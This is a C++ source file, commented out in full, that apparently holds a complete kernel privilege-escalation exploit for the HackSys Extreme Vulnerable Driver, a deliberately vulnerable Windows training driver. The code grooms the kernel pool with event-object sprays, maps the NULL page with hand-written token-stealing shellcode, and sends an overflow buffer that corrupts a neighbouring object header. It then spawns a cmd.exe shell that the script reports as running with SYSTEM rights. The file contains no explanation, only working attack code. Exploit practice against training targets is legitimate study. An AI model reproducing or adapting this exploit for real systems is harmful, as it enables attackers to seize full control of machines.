/*#include <iostream>
#include <vector>
#include <Windows.h>
using namespace std;

#define DEVICE_NAME         "\\\\.\\HackSysExtremeVulnerableDriver"
#define IOCTL               0x22200F

vector<HANDLE> defragment_handles;
vector<HANDLE> sequential_handles;

typedef NTSTATUS(WINAPI* _NtAllocateVirtualMemory)(
	HANDLE ProcessHandle,
	PVOID* BaseAddress,
	ULONG_PTR ZeroBits,
	PSIZE_T AllocationSize,
	ULONG AllocationType,
	ULONG Protect
	);

HANDLE grab_handle() {
	HANDLE hFile = CreateFileA(DEVICE_NAME,
		FILE_READ_ACCESS | FILE_WRITE_ACCESS,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,
		NULL);

	if (hFile == INVALID_HANDLE_VALUE) {
		cout << "[!] No handle to HackSysExtremeVulnerable Driver\n";
		exit(1);
	}

	cout << "[>] Grabbed handle to HackSysExtremeVulnerable Driver : " << hex << hFile << endl;

	return hFile;
}

void spray_pool() {
	cout << "[>] Spraying pool to defragment...\n";

	for (int i = 0; i < 10000; i++) {
		HANDLE result = CreateEvent(NULL,
			0,
			0,
			"");
		if (!result) {
			cout << "[!] Error allocating Event Object during defragmentation.\n";
			exit(1);
		}

		defragment_handles.push_back(result);
	}

	cout << "[>] Defragmentation spray complete.\n";
	cout << "[>] Spraying sequential allocations...\n";

	for (int i = 0; i < 10000; i++) {
		HANDLE result = CreateEvent(NULL,
			0,
			0,
			"");
		if (!result) {
			cout << "[!] Error allocating Event Object during sequential.\n";
			exit(1);
		}

		sequential_handles.push_back(result);
	}
	
	cout << "[>] Sequential spray complete.\n";

	cout << "[>] Poking 0x200 byte-sized holes in our sequential allocation...\n";
	for (int i = 0; i < sequential_handles.size(); i = i + 0x16) {
		for (int x = 0; x < 8; x++) {
			BOOL freed = CloseHandle(sequential_handles[i + x]);
			if (freed == false) {
				cout << "[!] Unable to free sequential allocation!\n";
				cout << "[!] Last error: " << GetLastError() << endl;
				exit(1);
			}
		}
	}
	cout << "[>] Holes poked lol.\n";
}

void allocate_shellcode() {
	_NtAllocateVirtualMemory NtAllocateVirtualMemory =
		(_NtAllocateVirtualMemory)GetProcAddress(GetModuleHandle("ntdll.dll"),
			"NtAllocateVirtualMemory");

	INT64 address = 0x1;
	int size = 0x100;

	HANDLE result = (HANDLE)NtAllocateVirtualMemory(
		GetCurrentProcess(),
		(PVOID*)& address,
		NULL,
		(PSIZE_T)& size,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
	);

	if (result == INVALID_HANDLE_VALUE) {
		cout << "[!] Unable to allocate NULL page...wtf?\n";
		cout << "[!] Last error: " << dec << GetLastError() << endl;
		exit(1);
	}
	cout << "[>] NULL page mapped.\n";
	cout << "[>] Placing pointer to shellcode on NULL page at offset 0x60...\n";

	BYTE shellcode[] = (
		"\x60"
		"\x64\xA1\x24\x01\x00\x00"
		"\x8B\x40\x50"
		"\x89\xC1"
		"\x8B\x98\xF8\x00\x00\x00"
		"\xBA\x04\x00\x00\x00"
		"\x8B\x80\xB8\x00\x00\x00"
		"\x2D\xB8\x00\x00\x00"
		"\x39\x90\xB4\x00\x00\x00"
		"\x75\xED"
		"\x8B\x90\xF8\x00\x00\x00"
		"\x89\x91\xF8\x00\x00\x00"
		"\x61"
		"\xC2\x10\x00"  // ret 0x10
		);

	LPVOID shellcode_addr = VirtualAlloc(NULL,
		sizeof(shellcode),
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	memcpy(shellcode_addr, shellcode, sizeof(shellcode));

	memset((void*)0x0, '\x00', 0x100);
	memcpy((void*)0x60, (void*)& shellcode_addr, 0x4);
}

void send_payload(HANDLE hFile) {
	ULONG payload_len = 0x220;

	BYTE* input_buff = (BYTE *)VirtualAlloc(NULL,
		payload_len + 0x1,
		MEM_RESERVE | MEM_COMMIT,
		PAGE_EXECUTE_READWRITE);

	BYTE overwrite_payload[] = (
		"\x40\x00\x08\x04"  // pool header
		"\x45\x76\x65\xee"  // pool tag
		"\x00\x00\x00\x00"  // obj header quota begin
		"\x40\x00\x00\x00"
		"\x00\x00\x00\x00"
		"\x00\x00\x00\x00"  // obj header quota end
		"\x01\x00\x00\x00"  // obj header begin
		"\x01\x00\x00\x00"
		"\x00\x00\x00\x00"
		"\x00\x00\x08\x00" // 0xc converted to 0x0
		);

	memset(input_buff, '\x42', 0x1F8);
	memcpy(input_buff + 0x1F8, overwrite_payload, 0x28);

	cout << "[>] Sending buffer size of " << dec << payload_len << endl;

	DWORD bytes_ret = 0;

	int result = DeviceIoControl(hFile,
		IOCTL,
		input_buff,
		payload_len,
		NULL,
		0,
		&bytes_ret,
		NULL);

	if (!result)
		cout << "[!] DeviceIoControl failed!\n";
}

void free_chunks() {
	cout << "[>] Freeing defragmentation allocations...\n";
	for (int i = 0; i < defragment_handles.size(); i++) {
		BOOL freed = CloseHandle(defragment_handles[i]);
		if (freed == false) {}
	}
	cout << "[>] Defragmentation allocations freed.\n";
	cout << "[>] Freeing sequential allocations...\n";
	for (int i = 0; i < sequential_handles.size(); i++) {
		BOOL freed = CloseHandle(sequential_handles[i]);
		if (freed == false) {}
	}
	cout << "[>] Sequential allocations freed.\n";
}

void spawn_shell() {
	cout << "[>] Spawning nt authority/system shell...\n";

	PROCESS_INFORMATION pi;
	ZeroMemory(&pi, sizeof(pi));

	STARTUPINFO si;
	ZeroMemory(&si, sizeof(si));

	CreateProcessA("C:\\Windows\\System32\\cmd.exe",
		NULL,
		NULL,
		NULL,
		0,
		CREATE_NEW_CONSOLE,
		NULL,
		NULL,
		&si,
		&pi);
}

int main(void) {
	HANDLE hFile = grab_handle();

	spray_pool();

	allocate_shellcode();

	send_payload(hFile);

	free_chunks();

	spawn_shell();

	return 0;
}*/